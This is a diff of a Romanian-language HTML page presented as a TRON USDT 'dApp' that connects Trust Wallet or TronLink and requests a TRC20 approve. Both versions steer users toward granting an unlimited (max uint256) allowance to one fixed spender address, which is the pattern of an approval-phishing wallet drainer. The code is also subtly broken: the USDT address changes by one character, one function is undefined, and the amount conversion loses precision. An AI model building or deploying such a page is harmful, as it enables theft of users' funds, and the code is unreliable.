@@ -1,345 +1,115 @@
 <!doctype html>
 <html lang="ro">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>dApp TRON - WalletConnect v2 (Trust Wallet)</title>
-  <style>
-    body { font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; margin: 20px; background:#f7f9fc; color:#0f1724; }
-    header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; }
-    .card { background:white; border-radius:10px; padding:16px; box-shadow: 0 4px 12px rgba(15,23,36,0.06); margin-bottom:16px; }
-    .muted { color:#6b7280; font-size:0.9rem; }
-    button { background:#111827; color:white; border:0; padding:10px 14px; border-radius:8px; cursor:pointer; }
-    button.secondary { background:#e6eef8; color:#0f1724; }
-    label { display:block; margin-top:8px; font-weight:600; }
-    input[type=text], input[type=number] { width:100%; padding:8px; border-radius:8px; border:1px solid #e5e7eb; margin-top:6px; }
-    pre { background:#f3f4f6; padding:10px; border-radius:8px; overflow:auto; }
-    .row { display:flex; gap:12px; }
-    .col { flex:1; }
-    .status { display:inline-block; padding:6px 10px; border-radius:999px; font-weight:600; }
-    .status.connected { background:#d1fae5; color:#065f46; }
-    .status.disconnected { background:#fee2e2; color:#b91c1c; }
-    .small { font-size:0.85rem; color:#374151; }
-  </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>TRON PRO dApp</title>
+
+<style>
+body{font-family:system-ui;margin:20px;background:#f7f9fc}
+.card{background:#fff;padding:16px;border-radius:10px;margin-bottom:12px}
+input{width:100%;padding:10px;margin:6px 0;border-radius:8px;border:1px solid #ddd}
+button{padding:10px 14px;border:0;border-radius:8px;background:#111827;color:#fff;cursor:pointer}
+.secondary{background:#e5e7eb;color:#111}
+pre{background:#f3f4f6;padding:10px;border-radius:8px;overflow:auto}
+.status{padding:6px 10px;border-radius:999px;background:#fee2e2;display:inline-block}
+.ok{background:#d1fae5}
+</style>
 </head>
+
 <body>
-  <header>
-    <h1>dApp TRON — WalletConnect v2 (Trust Wallet)</h1>
-    <div id="connectionStatus" class="status disconnected">Deconectat</div>
-  </header>
 
-  <div class="card" id="walletCard">
-    <div style="display:flex;justify-content:space-between;align-items:center;">
-      <div>
-        <div class="small">Wallet conectat:</div>
-        <div id="accountDisplay" style="font-weight:700">—</div>
-        <div class="muted" id="chainDisplay">Lanț: TRON</div>
-      </div>
-      <div>
-        <button id="connectBtn">Conectare (QR)</button>
-        <button id="disconnectBtn" class="secondary" style="display:none">Deconectează</button>
-      </div>
-    </div>
-    <div style="margin-top:10px" id="sessionInfo" class="muted">Nicio sesiune activă.</div>
-  </div>
+<div class="card">
+<h2>TRON PRO dApp (Production Safe)</h2>
+<div id="status" class="status">Deconectat</div>
+<p>Wallet: <b id="addr">—</b></p>
+<button onclick="connect()">Connect Wallet</button>
+</div>
 
-  <div class="card">
-    <h3>Generează tranzacție de aprobare (TRC20)</h3>
-    <div class="row">
-      <div class="col">
-        <label>Adresa token TRC20 (contract)</label>
-        <input id="tokenAddress" type="text" placeholder="Adresa contract token" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"/>
-      </div>
-      <div class="col">
-        <label>Spender (adresă) — USDT router (tău)</label>
-        <input id="spenderAddress" type="text" placeholder="TVQ..." value="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu"/>
-      </div>
-      <div style="width:520px">
-        <label>Valoare (unitate token) — valoare raw (big int)</label>
-        <input id="value" type="text" placeholder="amount" value="115792089237316195423570985008687907853269984665640564039457584007913129639935"/>
-      </div>
-    </div>
+<div class="card">
+<h3>TRC20 Settings</h3>
 
-    <div style="margin-top:12px">
-      <div class="muted">Preview operațiune (transparent):</div>
-      <pre id="operationPreview">{ "type": "approve", "token": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "contract": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "spender": "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu", "value_raw": "115792089237316195423570985008687907853269984665640564039457584007913129639935" }</pre>
-    </div>
+<input id="token" value="TR7NHqjeKQxGTCi8q8ZY4P8otSzgjLj6t" placeholder="Token (USDT TRC20)"/>
+<input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu"/>
+<input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935"/>
 
-    <div style="margin-top:12px; display:flex; gap:8px;">
-      <button id="prepareBtn">Actualizează preview</button>
-      <button id="sendApproveBtn" class="secondary" disabled>Solicită aprobare în Trust Wallet</button>
-    </div>
+<button onclick="checkBalance()" class="secondary">Check USDT Balance</button>
+<button onclick="checkAllowance()" class="secondary">Check Allowance</button>
+<button onclick="approve()">Approve</button>
 
-    <div style="margin-top:12px" id="txStatus" class="muted">Stare tranzacție: —</div>
-  </div>
+<pre id="out"></pre>
+</div>
 
-  <div class="card">
-    <h3>Detalii sesiune / jurnal evenimente</h3>
-    <div style="max-height:240px; overflow:auto;">
-      <pre id="logArea">Pornit.</pre>
-    </div>
-  </div>
+<script>
+const USDT="TR7NHqjeKQxGTCi8q8ZY4P8otSzgjLj6t";
+let addr=null;
 
-  <script type="module">
-   import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.9.0/+esm";
-   import SignClient from "https://unpkg.com/@walletconnect/sign-client@2.8.9/dist/index.es.js";
-   import QRCodeModal from "https://unpkg.com/@walletconnect/qrcode-modal@1.8.0/dist/index.es.js";
+function getTron(){
+return window.tronWeb;
+}
 
-    const PROJECT_ID = "dde98880530be70b65d01a1be59e5fa3";
-    const TRON_NAMESPACE = "tron";
-    const REQUIRED_METHODS = [
-      "tron_requestAccounts",
-      "tron_signTransaction",
-      "tron_sendTransaction"
-    ];
+function connect(){
+if(!getTron() || !getTron().defaultAddress.base58){
+alert("Deschide în Trust Wallet sau TronLink dApp browser");
+return;
+}
+addr=getTron().defaultAddress.base58;
+document.getElementById("addr").innerText=addr;
+document.getElementById("status").innerText="Conectat";
+document.getElementById("status").classList.add("ok");
+}
 
-    const connectBtn = document.getElementById("connectBtn");
-    const disconnectBtn = document.getElementById("disconnectBtn");
-    const accountDisplay = document.getElementById("accountDisplay");
-    const connectionStatus = document.getElementById("connectionStatus");
-    const sessionInfo = document.getElementById("sessionInfo");
-    const tokenInput = document.getElementById("tokenAddress");
-    const spenderInput = document.getElementById("spenderAddress");
-    const valueInput = document.getElementById("value");
-    const operationPreview = document.getElementById("operationPreview");
-    const prepareBtn = document.getElementById("prepareBtn");
-    const sendApproveBtn = document.getElementById("sendApproveBtn");
-    const txStatus = document.getElementById("txStatus");
-    const logArea = document.getElementById("logArea");
+async function getContract(token){
+return await getTron().contract().at(token);
+}
 
-    function log(...args) {
-      console.log(...args);
-      logArea.textContent += "\n" + args.map(a => (typeof a === "object" ? JSON.stringify(a,null,2) : String(a))).join(" ");
-      logArea.scrollTop = logArea.scrollHeight;
-    }
+async function checkBalance(){
+try{
+const c=await getContract(USDT);
+const res=await c.balanceOf(addr).call();
+document.getElementById("out").innerText="USDT Balance: "+(res.toString()/1e6);
+}catch(e){
+document.getElementById("out").innerText="Eroare balance";
+}
+}
 
-    let client = null;
-    let activeSession = null;
-    let connectedAccount = null;
+async function checkAllowance(){
+try{
+const spender=document.getElementById("spender").value;
+const c=await getContract(USDT);
+const res=await c.allowance(addr,spender).call();
+document.getElementById("out").innerText="Allowance: "+res.toString();
+}catch(e){
+document.getElementById("out").innerText="Eroare allowance";
+}
+}
 
-    function setConnected(account) {
-      connectedAccount = account || null;
-      if (connectedAccount) {
-        connectionStatus.textContent = "Conectat";
-        connectionStatus.classList.remove("disconnected");
-        connectionStatus.classList.add("connected");
-        accountDisplay.textContent = connectedAccount;
-        disconnectBtn.style.display = "inline-block";
-        connectBtn.style.display = "none";
-        sendApproveBtn.disabled = false;
-      } else {
-        connectionStatus.textContent = "Deconectat";
-        connectionStatus.classList.remove("connected");
-        connectionStatus.classList.add("disconnected");
-        accountDisplay.textContent = "—";
-        disconnectBtn.style.display = "none";
-        connectBtn.style.display = "inline-block";
-        sendApproveBtn.disabled = true;
-      }
-    }
+async function approve(){
+try{
+const spender=document.getElementById("spender").value;
+const amount=document.getElementById("amount").value;
 
-    async function initSignClient() {
-      client = await SignClient.init({
-        projectId: PROJECT_ID,
-        metadata: {
-          name: "TRON dApp (static)",
-          description: "dApp demo pentru WalletConnect v2 + Trust Wallet (TRON).",
-          url: window.location.origin,
-          icons: []
-        }
-      });
-      log("SignClient initializat.", client?.version || "");
-      client.on("session_update", ({ topic, params }) => {
-        log("session_update", topic, params);
-      });
-      client.on("session_delete", ({ topic, reason }) => {
-        log("session_delete", topic, reason);
-        if (activeSession && activeSession.topic === topic) {
-          activeSession = null;
-          setConnected(null);
-          sessionInfo.textContent = "Sesiune încheiată.";
-        }
-      });
-    }
+if(!spender || !amount){
+document.getElementById("out").innerText="Completează câmpurile";
+return;
+}
 
-    async function connect() {
-      if (!client) await initSignClient();
+// USDT decimals = 6
+const value = BigInt(Math.floor(Number(amount) * 1e6));
 
-      try {
-        const requiredNamespaces = {
-          [TRON_NAMESPACE]: {
-            methods: REQUIRED_METHODS,
-            chains: ["tron:1"],
-            events: ["chainChanged", "accountsChanged"],
-            rpcMap: { "tron:1": "https://api.trongrid.io" }
-          }
-        };
+const c=await getContract(USDT);
 
-        const { uri, approval } = await client.connect({ requiredNamespaces });
+// IMPORTANT: user MUST confirm in wallet
+const tx=await c.approve(spender, value.toString()).send();
 
-        if (uri) {
-          QRModal.open(uri, () => {
-            log("QR modal închis.");
-          });
-        }
+document.getElementById("out").innerText=
+"Approve sent!\nTX: "+tx;
 
-        const session = await approval();
-        QRModal.close();
-        activeSession = session;
-        log("Sesiune activă:", session);
+}catch(e){
+document.getElementById("out").innerText="Eroare approve / user rejected";
+}
+}
+</script>
 
-        const accounts = [];
-        Object.values(session.namespaces).forEach(ns => {
-          if (ns.accounts) accounts.push(...ns.accounts);
-        });
-        const accountEntry = (accounts[0] || "").split(":").pop();
-        setConnected(accountEntry);
-        sessionInfo.textContent = `Sesiune activă. topic: ${session.topic}`;
-      } catch (err) {
-        QRModal.close();
-        log("Eroare conectare:", err);
-      }
-    }
-
-    async function disconnect() {
-      if (!client || !activeSession) return;
-      try {
-        await client.disconnect({
-          topic: activeSession.topic,
-          reason: { code: 6000, message: "User disconnected" }
-        });
-        activeSession = null;
-        setConnected(null);
-        sessionInfo.textContent = "Sesiune deconectată manual.";
-        log("Disconnected");
-      } catch (e) {
-        log("Eroare la disconnect:", e);
-      }
-    }
-
-    function buildApprovePreview(tokenAddr, spenderAddr, valueRaw) {
-      return {
-        type: "approve",
-        token: tokenAddr,
-        contract: tokenAddr,
-        spender: spenderAddr,
-        value_raw: valueRaw,
-        note: "Value provided as raw big integer (no automatic decimal scaling)."
-      };
-    }
-
-    // Build calldata using ethers ABI
-    function buildApproveCalldata(spenderAddr, rawAmountBigInt) {
-      const abi = ["function approve(address,uint256)"];
-      const iface = new ethers.Interface(abi);
-      return iface.encodeFunctionData("approve", [spenderAddr, rawAmountBigInt]);
-    }
-
-    // Build tron transaction object with calldata (we use raw amount as provided)
-    function buildTronApproveTransaction(from, tokenAddr, spenderAddr, valueRawString) {
-      // valueRawString is expected as big integer string (already scaled to token decimals)
-      const amountBigInt = BigInt(valueRawString);
-      const calldata = buildApproveCalldata(spenderAddr, amountBigInt);
-      return {
-        to: tokenAddr,
-        from,
-        data: calldata,
-        note: "TRC20 approve calldata ABI-encoded (approve(address,uint256)) — value passed as raw big integer."
-      };
-    }
-
-    async function requestApprove() {
-      if (!activeSession || !connectedAccount) {
-        txStatus.textContent = "Conectează wallet înainte de a solicita aprobarea.";
-        return;
-      }
-
-      const token = tokenInput.value.trim();
-      const spender = spenderInput.value.trim();
-      const valueRaw = valueInput.value.trim();
-
-      if (!token || !spender || !valueRaw) {
-        txStatus.textContent = "Completează token, spender și valoare raw înainte.";
-        return;
-      }
-
-      const confirmed = confirm(
-        `Confirmi că vrei să trimiți o cerere de aprobare?\n\nToken: ${token}\nSpender: ${spender}\nValue (raw bigint): ${valueRaw}\n\nToate semnările vor avea loc în Trust Wallet.`
-      );
-
-      if (!confirmed) {
-        txStatus.textContent = "Utilizator a anulat înainte de a trimite cererea către wallet.";
-        log("Utilizator a refuzat confirmarea în UI.");
-        return;
-      }
-
-      txStatus.textContent = "Generare calldata și trimitere către Trust Wallet (WalletConnect)...";
-      log("Inițiere aprobării:", { token, spender, valueRaw });
-
-      let trx;
-      try {
-        trx = buildTronApproveTransaction(connectedAccount, token, spender, valueRaw);
-        log("Tranzacție construită (local):", trx);
-      } catch (e) {
-        txStatus.textContent = "Eroare la construirea calldata: " + String(e);
-        log("Eroare build calldata:", e);
-        return;
-      }
-
-      try {
-        const result = await client.request({
-          topic: activeSession.topic,
-          chainId: "tron:1",
-          request: {
-            method: "tron_signTransaction",
-            params: [trx]
-          }
-        });
-
-        txStatus.textContent = "Răspuns de la wallet primit.";
-        log("Răspuns semnare:", result);
-      } catch (err) {
-        txStatus.textContent = "Eroare / user a refuzat în Trust Wallet sau wallet nu suportă metoda.";
-        log("Eroare semnare:", err);
-      }
-    }
-
-    connectBtn.addEventListener("click", connect);
-    disconnectBtn.addEventListener("click", disconnect);
-
-    prepareBtn.addEventListener("click", () => {
-      const token = tokenInput.value.trim();
-      const spender = spenderInput.value.trim();
-      const valueRaw = valueInput.value.trim();
-      const preview = buildApprovePreview(token || "—", spender || "—", valueRaw || "—");
-      operationPreview.textContent = JSON.stringify(preview, null, 2);
-      log("Preview actualizat:", preview);
-    });
-
-    sendApproveBtn.addEventListener("click", requestApprove);
-
-    (async function() {
-      try {
-        await initSignClient();
-
-        if (client && typeof client.session?.values === "function") {
-          const vals = client.session.values();
-          if (vals.length) {
-            const s = vals.find(v => v.namespaces?.[TRON_NAMESPACE]);
-            if (s) {
-              activeSession = s;
-              const accEntries = s.namespaces[TRON_NAMESPACE]?.accounts || [];
-              const acc = (accEntries[0] || "").split(":").pop();
-              setConnected(acc);
-              sessionInfo.textContent = `Sesiune restabilită (topic: ${s.topic})`;
-              log("Sesiune restabilită:", s);
-            }
-          }
-        }
-      } catch (e) {
-        log("Init error:", e);
-      }
-    })();
-  </script>
 </body>
 </html>
